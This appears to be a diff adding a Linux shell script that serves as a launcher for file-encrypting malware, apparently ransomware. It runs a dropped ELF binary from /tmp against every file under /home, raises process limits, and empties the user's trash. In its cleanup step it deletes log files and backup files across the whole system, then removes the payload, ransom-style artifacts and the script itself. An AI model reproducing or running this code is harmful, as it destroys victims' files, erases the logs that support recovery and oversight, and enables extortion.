@@ -1,0 +1,81 @@
+#!/bin/sh
+
+
+# Linux
+#
+# Settings
+TARGET_PATH="/home"
+PAYLOAD_DIR="/tmp"
+PAYLOAD_NAME="164f8295_linux.elf"
+
+
+#
+# Functions
+ExecPayload()
+{
+	echo "[*] Exec payload: $PAYLOAD_DIR/$PAYLOAD_NAME \"$1\""
+	nohup $PAYLOAD_DIR/$PAYLOAD_NAME "$1" >/dev/null 2>&1&
+}
+
+SetLimits()
+{
+	ulimit -n $(ulimit -Hn)
+	ulimit -p $(ulimit -Hp)
+}
+
+EmptyTrash()
+{
+	rm -rf ~/.local/share/Trash/info/* ~/.local/share/Trash/files/*
+}
+
+ScanPath()
+{
+	echo "[*] Scan path: $1"
+	find "$1" -type f | while read path
+	do
+		if [ -f "$path" ]; then
+			ExecPayload "$path"
+		fi
+	done
+}
+
+WaitPayload()
+{
+	PWC=$(ps | grep $PAYLOAD_NAME | grep -v grep | wc -l)
+	while [ $PWC -ne 0 ]; do
+		echo "[*] Wait payload: $PWC"
+		sleep 1
+		PWC=$(ps | grep $PAYLOAD_NAME | grep -v grep | wc -l)
+	done
+}
+
+Cleanup()
+{
+	echo "[*] Cleanup"
+	find / -name *.log -exec rm -rf {} \;
+	find / -type f -name *.*~ -exec rm -rf {} \;
+
+	rm -f $PAYLOAD_DIR/$PAYLOAD_NAME $PAYLOAD_DIR/index.html $PAYLOAD_DIR/motd
+
+	rm -- "$0"
+}
+
+
+#
+# Logic
+chmod +x $PAYLOAD_DIR/$PAYLOAD_NAME
+SetLimits
+EmptyTrash
+
+if [ $# -eq 1 ]; then
+	echo "[*] Scan specified path: $1"
+	ScanPath "$1"
+	WaitPayload
+else
+	echo "[*] Scan generic path"
+	ScanPath $TARGET_PATH
+	WaitPayload
+	Cleanup
+fi
+
+echo "[*] Done"
